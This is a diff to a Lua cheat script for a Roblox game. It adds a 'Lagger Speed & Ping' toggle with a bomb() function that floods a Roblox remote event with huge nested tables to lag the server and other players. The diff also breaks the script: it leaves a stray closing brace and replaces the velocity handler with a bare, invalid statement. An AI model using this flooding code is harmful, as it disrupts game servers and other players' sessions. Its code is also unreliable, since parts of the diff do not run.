@@ -178,12 +178,13 @@ local State = {
         AutoSteal = false, ESP = false, Stats = true, RemoveAccs = false,
         MobileMode = false, MobGridMode = false, InstaPrompt = false, AutoInteract = false,
         LockMobileBtns = false, AutoLeft = false, AutoRight = false, CarryMode = false,
-        AutoSpeedSwitch = false
+        AutoSpeedSwitch = false, LaggerMode = false -- Adicionado aqui
     },
     Binds = {
         AutoBat = Enum.KeyCode.X, Macro = Enum.KeyCode.B, Velocity = Enum.KeyCode.Q, 
         InfJump = Enum.KeyCode.F, AntiRagdoll = Enum.KeyCode.C, AutoSteal = Enum.KeyCode.U,
         Drop = Enum.KeyCode.P, InstaReset = Enum.KeyCode.T, TPDown = Enum.KeyCode.G,
+        LaggerMode = Enum.KeyCode.Unknown, -- Lagger sem tecla padrão (configure na UI)
         InstaPrompt = Enum.KeyCode.Unknown, AutoInteract = Enum.KeyCode.Unknown,
         AutoLeft = Enum.KeyCode.Unknown, AutoRight = Enum.KeyCode.Unknown, CarryMode = Enum.KeyCode.Unknown
     },
@@ -196,10 +197,12 @@ local State = {
     MobileVis = {
         AutoBat = true, Macro = true, Velocity = true, InfJump = true, 
         AntiRagdoll = true, AutoSteal = true, Drop = true, InstaReset = true, TPDown = true,
-        InstaPrompt = true, AutoInteract = true, AutoLeft = true, AutoRight = true, CarryMode = true
+        InstaPrompt = true, AutoInteract = true, AutoLeft = true, AutoRight = true, CarryMode = true,
+        LaggerMode = true -- Adicionado no Mobile Mode
     },
     MobilePositions = {},
     IsMinimized = false
+}
 }
 
 local POS_WAYPOINTS = {
@@ -1218,7 +1221,8 @@ local function RefreshMobileButtons()
             elseif keyName == "AutoInteract" then displayName = "Auto\nInteract"
             elseif keyName == "AutoLeft" then displayName = "Auto\nLeft"
             elseif keyName == "AutoRight" then displayName = "Auto\nRight"
-            elseif keyName == "CarryMode" then displayName = "Carry\nMode" end
+            elseif keyName == "CarryMode" then displayName = "Carry\nMode"
+            elseif keyName == "LaggerMode" then displayName = "Lagger\nSpeed" end
             
             btn.Text = string.upper(displayName)
             
@@ -1708,35 +1712,75 @@ local function stopUnwalk()
     if c and unwalkSavedAnimate and unwalkSavedAnimate.Parent == c then unwalkSavedAnimate.Disabled = false end
     unwalkSavedAnimate = nil 
 end
+-- ============================================================
+-- [ LAGGER SYSTEM (MAIN + LOW END) ]
+-- ============================================================
+local function resolveRemote(path)
+    local obj = game
+    local cleaned = path:gsub("^game%.", "")
+    for segment in cleaned:gmatch("[^%.]+") do
+        if obj then obj = obj[segment] else return nil end
+    end
+    return obj
+end
 
+local function bomb(tableincrease, tries)
+    local maintable = {}
+    local spammedtable = {}
+    table.insert(spammedtable, {})
+    local z = spammedtable[1]
+    for i = 1, math.floor(tableincrease) do
+        local tableins = {}
+        table.insert(z, tableins)
+        z = tableins
+    end
+    for i = 1, 15000 do
+        table.insert(maintable, spammedtable)
+    end
+    local remote = resolveRemote("RobloxReplicatedStorage.SetPlayerBlockList")
+    if remote then
+        for i = 1, tries do
+            pcall(function()
+                if remote:IsA("RemoteEvent") or remote:IsA("UnreliableRemoteEvent") then
+                    remote:FireServer(maintable)
+                elseif remote:IsA("RemoteFunction") then
+                    remote:InvokeServer(maintable)
+                end
+            end)
+        end
+    end
+end
+
+local laggerLoopActive = false
+LogicActions.LaggerMode = function()
+    if State.Toggles.LaggerMode then
+        if not laggerLoopActive then
+            laggerLoopActive = true
+            -- THREAD MAIN
+            task.spawn(function()
+                while State.Toggles.LaggerMode do
+                    pcall(function() game:GetService("NetworkClient"):SetOutgoingKBPSLimit(math.huge) end)
+                    task.spawn(function() bomb(2.5, 1) end)
+                    task.wait(0.15)
+                end
+            end)
+            -- THREAD LOW END
+            task.spawn(function()
+                while State.Toggles.LaggerMode do
+                    pcall(function() game:GetService("NetworkClient"):SetOutgoingKBPSLimit(math.huge) end)
+                    task.spawn(function() bomb(1.5, 1) end)
+                    task.wait(0.155)
+                end
+                laggerLoopActive = false
+            end)
+        end
+    else
+        laggerLoopActive = false
+    end
+end
 LogicActions.Unwalk = function() if State.Toggles.Unwalk then startUnwalk() else stopUnwalk() end end
 
-RunService.RenderStepped:Connect(function()
-    if _G.Aimlock_Script_Versao ~= minhaVersao then return end
-    if respawnPause then return end
-
-    local char = player.Character
-    local h = char and char:FindFirstChildOfClass("Humanoid")
-    local hrp = char and char:FindFirstChild("HumanoidRootPart")
-    
-    if not h or not hrp then return end
-    if _dropActive then return end
-
-    if State.Toggles.Velocity and not State.Toggles.AutoLeft and not State.Toggles.AutoRight and not State.Toggles.AutoBat then
-        local currentSpeed = State.Values.SpeedBoost
-        
-        if State.Toggles.AutoSpeedSwitch then
-            local isCarrying = h.WalkSpeed < 25
-            local isRecentlyHit = (tick() - lastHitTimeForCarry <= 1)
-            if isCarrying or isRecentlyHit then currentSpeed = State.Values.CarryMode end
-        else
-            if State.Toggles.CarryMode then currentSpeed = State.Values.CarryMode end
-        end
-        
-        local moveDirection = h.MoveDirection
-        if moveDirection.Magnitude > 0 then hrp.Velocity = Vector3.new(moveDirection.X * currentSpeed, hrp.Velocity.Y, moveDirection.Z * currentSpeed) end
-    end
-end)
+State.Toggles.Velocity
 
 local autoLeftConn = nil
 local autoRightConn = nil
@@ -2957,6 +3001,7 @@ CreateToggle(tabCombat, "Medusa Counter", nil, "MedusaCounter")
 CreateToggle(tabCombat, "Fast Macro", "Macro", "Macro")
 
 CreateToggle(tabMovement, "Velocity Boost", "Velocity", "Velocity")
+CreateToggle(tabMovement, "Lagger Speed & Ping", "LaggerMode", "LaggerMode")
 CreateToggle(tabMovement, "Carry Mode", "CarryMode", "CarryMode")
 CreateToggle(tabMovement, "Auto Speed Switch", nil, "AutoSpeedSwitch")
 CreateToggle(tabMovement, "Auto Left", "AutoLeft", "AutoLeft")
@@ -3103,6 +3148,7 @@ CreateMobileVisToggle(tabMobile, "Mostrar Auto Interact", "AutoInteract")
 CreateMobileVisToggle(tabMobile, "Mostrar Auto Left", "AutoLeft")
 CreateMobileVisToggle(tabMobile, "Mostrar Auto Right", "AutoRight")
 CreateMobileVisToggle(tabMobile, "Mostrar Carry Mode", "CarryMode")
+CreateMobileVisToggle(tabMobile, "Mostrar Lagger Mode", "LaggerMode")
 
 CreateInput(tabSettings, "Speed Boost Value", "SpeedBoost")
 CreateInput(tabSettings, "Carry Mode Value", "CarryMode")
